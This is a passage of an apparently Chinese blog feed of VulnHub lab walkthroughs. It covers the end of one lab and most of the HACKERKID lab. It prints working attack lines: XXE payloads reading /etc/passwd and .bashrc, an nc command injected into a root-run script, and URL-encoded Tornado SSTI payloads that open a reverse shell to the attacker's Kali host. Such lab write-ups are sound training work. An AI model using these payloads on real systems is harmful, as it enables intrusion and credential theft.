&lt;h3 id=&#34;py脚本提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py脚本提权&#34;&gt;#&lt;/a&gt; py 脚本提权&lt;/h3&gt;
&lt;p&gt;查看是否有除 root 账户以外的有 bash 的用户 &lt;code&gt;cat /etc/passwd | grep bash&lt;/code&gt; &lt;br&gt;
 查看是否有相关的敏感文件泄漏，找到了一个备份的密码文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-778.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且 Asterisk 的中文为星号&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-779.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过遗留的密码切换到更高一级的用户 athena 上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-780.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看相应的权限设置是否正确，发现可以直接调用 root 账户执行这个 py 脚本&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-781.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接利用 root 权限执行此脚本&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-782.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并没有什么新发现，阅读此文件，发现可以通过拼接命令执行系统命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-783.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;构造命令 &lt;code&gt;id;nc 192.168.31.58 4445 -e /bin/bash;&lt;/code&gt;  执行，将 shell 反弹到 kali 机器上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-784.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Kali 上用来监听此端口，成功拿到了反弹的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-785.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 21-30" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/126%20HACKERKID/</id>
        <title>VULNHUB 26 HACKERKID</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/126%20HACKERKID/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2VyLWtpZC0xMDEsNzE5Lw==&#34;&gt;https://www.vulnhub.com/entry/hacker-kid-101,719/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDEwNzgzNi9hcnRpY2xlL2RldGFpbHMvMTE5NDIyODEw&#34;&gt;https://blog.csdn.net/weixin_44107836/article/details/119422810&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 HACKERKID：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）设置免密使用 sudo&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看 sudoers&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo cat /etc/sudoers | tail -n 12 | head -n 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加免密登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parallels ALL=(ALL) NOPASSWD:ALL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;tail&lt;/span&gt; -n表示筛选后面几行，&lt;span class=&#34;built_in&#34;&gt;head&lt;/span&gt; -n表示筛选前面几行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-620.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;2 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-621.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.11&lt;/p&gt;
&lt;p&gt;3 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p 192.168.31.11&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-622.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 53,80,9999&lt;/p&gt;
&lt;h3 id=&#34;burp-重发数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-重发数据包&#34;&gt;#&lt;/a&gt; Burp 重发数据包&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE=&#34;&gt;http://192.168.31.11&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-623.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;右键检查网页的源代码，发现提示，存在 page_no 的 GET 参数，即存在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE/cGFnZV9ubz14eA==&#34;&gt;http://192.168.31.11?page_no=xx&lt;/span&gt; 的一个页面，可以通过 py 来编写 1-100 的自然数，并且用 burp 进行批量访问&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-624.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;编写 python 脚本，用于生成 1-100 个数字，每行有 1 个数字&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-625.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 tail 和 head 命令来检查所生成的文件是否正确&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-626.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用浏览器拦截数据发送至 burp&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-627.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将数据发送到 indruder 模式，在 page_no=&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 的位置设置字典，字典为前面 py 生成或者可以用 burp 自带的生成 1-100 的间隔为 1 的爆破字典&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-628.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 将接收包进行长度的排序得到一个不一样的长度，对应的 url 地址是 http://192.168.31.11?page_no=21&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-629.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;修改本地-hosts&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改本地-hosts&#34;&gt;#&lt;/a&gt; 修改本地 hosts&lt;/h3&gt;
&lt;p&gt;得到提示，有一些子域名被创建出来了，并且其中之一是 hackers.blackhat.local&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-630.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;修改本地 hosts 文件，将此域名的 ip 解析指向为靶机地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-631.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 http://hackers.blackhat.local 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-632.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示接下来的思路是搜集到更多的子域名信息，并且这些子域名解析后的地址指向为靶机的 ip 地址，通过 dig 来指定 DNS 服务器搜集 hackers.blackhat.local 信息&lt;/p&gt;
&lt;h3 id=&#34;dig指定dns解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dig指定dns解析&#34;&gt;#&lt;/a&gt; dig 指定 DNS 解析&lt;/h3&gt;
&lt;p&gt;Linux 下解析域名除了使用 nslookup 之外，开可以使用 dig 命令来解析域名，dig 命令可以得到更多的域名信息。dig 命令主要用来从 DNS 域名服务器查询主机地址信息。dig 的全称是 (domain information groper) 域信息筛选器。它是一个用来灵活探测 DNS 的工具。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dig hackers.blackhat.local @192.168.31.11&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;从指定的 DNS 服务器上进行查询，(从默认的 DNS 服务器上获得的结果可能不准确)。指定 DNS 服务器的方式为使用 @ 符号，如果不指定 DNS 服务器，dig 会依次使用 /etc/resolv.conf 里的地址作为 DNS 服务器：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-633.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到了一个新的子域名，将 dig 的结果添加到本地 hosts 文件中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-634.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2tlcmlkLmJsYWNraGF0LmxvY2Fs&#34;&gt;http://hackerid.blackhat.local&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-635.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;xxe-读取敏感信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe-读取敏感信息&#34;&gt;#&lt;/a&gt; xxe 读取敏感信息&lt;/h3&gt;
&lt;p&gt;将所有的信息都填写上，进行数据包的抓取，判断数据是怎么进入后台的，是否存在相应的漏洞可以进行利用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-636.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 burp 抓取数据，发现数据是以 xml 的形式传播的，可以测试 xxe 漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-637.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 xxe 漏洞进行读取 /etc/passwd&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;payload&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY dd SYSTEM &amp;#x27;file:///etc/passwd&amp;#x27;&amp;gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;root&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;name&amp;gt;&amp;lt;/name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;tel&amp;gt;&amp;lt;/tel&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;email&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;amp;dd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;/email&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;password&amp;gt;&amp;lt;/password&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/root&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-638.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 读取成功，并且找到了相关用户，如 saket，接下来尝试读取各种敏感文件。利用 php 为协议：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;完整的payload是&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY dd SYSTEM &amp;#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&amp;#x27;&amp;gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;root&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;name&amp;gt;&amp;lt;/name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;tel&amp;gt;&amp;lt;/tel&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;email&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;amp;dd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/email&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;password&amp;gt;&amp;lt;/password&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/root&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-639.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;出现了一串 base64 加密的字符，利用 base -d 解密后发现是用户名和密码&lt;br&gt;
 &lt;code&gt;cat bashrc.txt| base64 -d&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-640.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; username=“admin” password=“Saket!#$%@!!”&lt;/p&gt;
&lt;h3 id=&#34;用户名喷洒&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户名喷洒&#34;&gt;#&lt;/a&gt; 用户名喷洒&lt;/h3&gt;
&lt;p&gt;这是一个 ssh 登陆或者网站的后台密码，前面端口扫描时有个 9999 端口没有收集信息，我们进到这个页面看看这个 9999 端口是什么&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-641.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试用破解出来的账户密码登陆时发现登陆失败&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-642.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过前面收集到的信息的总结，知道 /home 目录下有 saket 的用户，并且密码中也有 saket 的存在，尝试将用户名换为 saket 进行登陆&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-643.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;—&amp;gt; 成功拿到后台权限&lt;/p&gt;
&lt;h3 id=&#34;ssti模板注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti模板注入&#34;&gt;#&lt;/a&gt; SSTI 模板注入&lt;/h3&gt;
&lt;p&gt;登陆后台成功，提示需要一个 name 的参数&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-644.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 /name=1 的参数输入，在页面上出现了回显&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-645.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;接下来目标转向如何利用这个漏洞，用 nmap 扫描这个端口处是否存在框架&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-646.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫描到的结果是 torando 框架&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-647.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现框架为 python 框架，既然是 py 的，就可以尝试一下 SSTI 模板注入&lt;br&gt;
关于 SSTI 模板注入，在 hacktrick 上有很详细的说明:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL3NzdGktc2VydmVyLXNpZGUtdGVtcGxhdGUtaW5qZWN0aW9u&#34;&gt;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;SSTI 模板注入:  &lt;code&gt;http://192.168.31.60:9999/?name=&amp;#123;&amp;#123; 2 * 2 &amp;#125;&amp;#125;&lt;/code&gt; &lt;br&gt;
 页面回显为计算结果 4 ，表示此处确实存在 SSTI 模板注入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-648.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;导入包 os，执行系统命令:&lt;br&gt;
 &lt;code&gt;http://192.168.31.60:9999/?name=&amp;#123;%%20import%20os%20%&amp;#125;&amp;#123;&amp;#123;os.system(%27id%)27)&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-649.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;虽然当前没有回显出 id 命令执行后的结果，但是却也没有报错&lt;/p&gt;
&lt;h3 id=&#34;ssti-反弹绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti-反弹绕过&#34;&gt;#&lt;/a&gt; SSTI 反弹绕过&lt;/h3&gt;
&lt;p&gt;尝试用此处的 SSTI 模板进行反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://192.168.31.60:9999/?name=&amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123;os.system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4446 &gt;&amp;1&#34;&#39;)&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-650.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反弹 shell 时报错，接下来用编码的方式绕过这种检查&lt;/p&gt;
&lt;p&gt;采用 url 编码的方式，在线地址为 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5qc29ucy5jbi91cmxlbmNvZGU=&#34;&gt;http://www.jsons.cn/urlencode&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;将 payload 进行编码后，拼接到原 url 后面，访问页面&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://192.168.31.11:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.135%2F4444%200%3E%261%22%27)%7D%7D&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-651.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;与此同时，监听对应的端口，等到 shell 的反弹&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-652.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到 shell&lt;/p&gt;
&lt;h3 id=&#34;弹出标准-shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#弹出标准-shell&#34;&gt;#&lt;/a&gt; 弹出标准 SHELL&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;美化得到的终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo; fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;或者使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHELL=/bin/bash script -q /dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;SHELL是环境变量，它的值代表系统执行shell的文件位置。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;script 命令的原本作用是录制终端的会话过程，执行该命令后会运行一个新的shell，在此shell中执行命令的过程将会记录下来并保存在一个文件里面。这里执行 script 并不需要录制命令过程，我们需要的仅仅是它会运行一个新的shell。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-q 代表以静默方式运行一个新的shell，也就是说在后台运行一个新的shell。如果不加这个参数，则会弹出一个新的shell命令框。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span 